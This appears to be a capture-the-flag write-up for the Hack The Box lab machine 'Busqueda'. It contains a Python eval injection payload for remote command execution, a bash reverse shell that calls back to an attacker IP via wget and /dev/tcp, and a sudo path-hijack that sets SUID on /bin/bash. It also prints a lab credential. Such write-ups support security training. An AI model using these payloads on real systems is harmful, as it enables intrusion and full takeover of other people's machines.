<h2>Target: 10.10.11.208  Busqueda </h2>

<b>Initial Access:</b><br>

Step 1: nmap -Pn --min-rate=5000 10.10.11.208 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
Nmap returns open ports 22,80

Step 2: Enumerate these open ports further with nmap: nmap -Pn --min-rate=5000 10.10.11.208 -p 22,80 -sC -sV -oN nmap-busqueda

![image](https://user-images.githubusercontent.com/93153300/233803760-57cf0e67-c801-4a14-aea2-6da8eb22ed30.png)  

Step 3: Nmap shows a redirect to http://searcher.htb.  In order to be able to reach the site add into /etc/hosts file the following line:  10.10.11.208 searcher.htb

Step 4: Navigating to searcher.htb shows:

![image](https://user-images.githubusercontent.com/93153300/233803766-f31ae9ae-a16c-4528-9c39-3932842cd7b3.png)

The bottom of the page shows a search bar.  Click on search, capture the request in burp suite, and send the captured request to repeater:

![image](https://user-images.githubusercontent.com/93153300/233803769-adda7d6d-4031-4b77-829e-ebbf859ac952.png)

Step 5: In repeater enter the following python code in the query body parameter: 

query=a'+eval(compile('import os; os.system("ls -al")',"a","single"))+'

Url encode the query body parameter and send the request: a'%2beval(compile('import+os%3b+os.system("ls+-al")',"a","single"))%2b'

![image](https://user-images.githubusercontent.com/93153300/233803771-7f6124b8-9e7a-4aac-9b36-759534c429e3.png)

The response shows that we have remote command execution, as we gave a command of ‘ls -al’ and the response lists the files on the target in the current directory.  We will use this to get a reverse shell.  

Step 6: Create a file called ‘test’ that contains a bash reverse shell:  bash -c "bash -i >& /dev/tcp/10.10.14.106/443 0>&1"

Step 7: Open a python web server in the directory where our ‘test’ file is located: python3 -m http.server 80

Step 8: Upload the ‘test’ file to the target by entering in the query body parameter the following command: wget http://10.10.14.106/test -O /dev/shm/test

Url encode it: a'%2beval(compile('import+os%3b+os.system("wget+http%3a//10.10.14.106/test+-O+/dev/shm/test")',"a","single"))%2b'

Send the request:

![image](https://user-images.githubusercontent.com/93153300/233803778-54edbf3a-5fa6-4158-93ff-d193f7bd18e2.png)

Step 9: Give the /dev/shm/test file execute permission by entering in the query body parameter the following command: chmod 777 /dev/shm/test 

Url encode it, and then send the request:

![image](https://user-images.githubusercontent.com/93153300/233803782-23dcb324-5879-4fef-9a1b-1c1a77ceeac4.png)

Step 10: Open a netcat/pwncat listner to catch the reverse shell: pwncat-cs -lp 443

Step 11: Run the ‘/dev/shm/test’ file by entering in the query body parameter the following command: /dev/shm/test

![image](https://user-images.githubusercontent.com/93153300/233803784-bbc3b7b8-b31e-4c9d-9e17-036bc55ad816.png)
 
Our pwncat caught the request.  We have shell as user svc.  We can get the flag at /home/svc/user.txt.
__________________________________________________
<b>Privilege Escalation:</b><br>

Step 1: Read the file /var/www/app/.git/config:

![image](https://user-images.githubusercontent.com/93153300/233803787-71c456d0-831d-4b1b-aff7-5032fcb93356.png)
 
The file contains credentials (Username ‘cody’ and password ‘jh1usoih2bkjaspwe92’).  Trying the password for user svc works:  ssh svc@searcher.htb → enter the password when prompted.  

Step 2: sudo -l shows: 

![image](https://user-images.githubusercontent.com/93153300/233803795-f0df1453-1ce0-4d81-8764-df482b8f3551.png)

Step 3:  Run the command: sudo /usr/bin/python3 /opt/scripts/system-checkup.py --help:

 ![image](https://user-images.githubusercontent.com/93153300/233803796-af002b2e-d701-4312-9ba4-feb14817c288.png)

This shows the options we can use with the command.  

Step 4: Run the command: sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps

![image](https://user-images.githubusercontent.com/93153300/233803800-f69699b1-2d9b-4b9e-b0bc-9b72f864c1ec.png)

This shows information about the docker containers.

Step 5: Run the command: sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect

This command doesn’t work, and shows a ‘Usage’ message:

![image](https://user-images.githubusercontent.com/93153300/233803807-f827df37-6dbb-4413-bfbf-b653a1e5df59.png)

Google search ‘docker-inspect’.  This search found a site that shows how to use docker-inspect: https://docs.docker.com/engine/reference/commandline/inspect 

![image](https://user-images.githubusercontent.com/93153300/233803812-267558bd-1d25-4ae4-8b7d-cc52cc0d4301.png)

Step 6: Run the command: sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db

![image](https://user-images.githubusercontent.com/93153300/233803816-b8b9c7b3-bef3-4a50-9e4f-69211b915758.png)

This dumps sql passwords and other sensitive information.  This seems like a rabbit hole as there is nothing further to do with the information found here.  

Step 7: Sudo -l showed that the command used is in the directory /opt/scripts.  Check what else that directory contains: 

![image](https://user-images.githubusercontent.com/93153300/233803826-8cecf636-95c3-4228-ac3f-1be8786f05e4.png)
  
The file full-checkup.sh seems interesting as that seems to be shown in sudo -l:

![image](https://user-images.githubusercontent.com/93153300/233803834-6f82411a-7d2a-4d57-bdfe-f1aeefea749a.png)

Step 8: Create a file called full-checkup.sh in the directory /home/svc that contains the command ‘chmod 4755 /bin/bash’.  

Step 9: Give executable permissions to the file /home/svc/full-checkup.sh: chmod +x /home/svc/full-checkup.sh.  

Step 10: Run the command: sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

Step 11: Run the command: /bin/bash -p

We have shell as root.  We can get the flag at /root/root.txt.
